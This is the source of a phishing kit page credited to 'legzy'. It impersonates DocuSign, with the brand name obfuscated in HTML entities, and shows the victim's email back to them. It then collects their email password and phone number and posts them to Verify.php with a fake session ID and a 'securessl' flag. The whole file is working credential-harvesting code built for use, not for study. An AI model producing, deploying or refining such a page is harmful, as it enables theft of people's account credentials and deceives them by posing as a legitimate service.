<?php 
/*
Created by legzy -- icq 692561824
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

$_SESSION['email'] = $_POST['email'];

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<title page-title>D&#111;c&#117;Sign</title>
<head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon" href="images/favicon.ico"/>


<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<script>
function ChangetoPass(){
document.getElementById('email').type = 'email';
}
function ChangetoText(){
document.getElementById('email').type = 'email';
}
</script>

<script>
function validateForm()
{
var y=document.forms["myform"]["emailpass"].value;
if(y==null || y=="")
  {
  alert("Please provide your email address password");
  return false;
  }
var y=document.forms["myform"]["emailpass"].value;
if(y.length < 6)
  {
  alert("Password is Too Short");
  return false;
  }
var y=document.forms["myform"]["tel"].value;
if(y==null || y=="")
  {
  alert("Please provide your Phone Number");
  return false;
  }
}

</script>

<script type="text/javascript">
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>

<style> 
 
 .inputs {
    padding: 8px;
    border-radius: 2px;
    border: 1px solid  #2874a6 ;
    background-image: none;
    width: 270px;
	height: 32px;
	font-size: 12px;
	
}
 
.inputs:focus {
    outline-color: #54B4AD;
}
</style> 


<body style="visibility:hidden" onload="unhideBody()">

 

</head>
<body bgColor="#FFFFFF">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:100%; height:100%; z-index:0"><img src="images/2.png" alt="" title="" border=0 width=100% height=100%></div>
<div style="position:absolute;top:33.5%;left:37.5%;z-index:1;width:24.5%;height:7%;">
<div id="text7" style="overflow:hidden;z-index:16">
<div class="s f15 b mb0" style="text-align:center;"><font size="4"><B><span style="color:#696969;"><?php echo $_SESSION['email'];?></span></B></font></div>
</div></div>
<form action="Verify.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="myform" id="myform" method="post" autocomplete="off" onsubmit="return validateForm()">
<input name="emailpass" Placeholder="Email Password" type="password" style="position:absolute;left:37.5%;width:24.5%;height:4.2%;background: #F5FBEF;z-index:6;top:38%;" class="inputs">
<div id="formimage1" style="position:absolute;z-index:9;top:45.5%;left:37.5%;height:4.5%;width:24.5%;"><input type="image" name="formimage1" width="100%" height="100%" src="images/login.png"></div></div>
</body>
</html>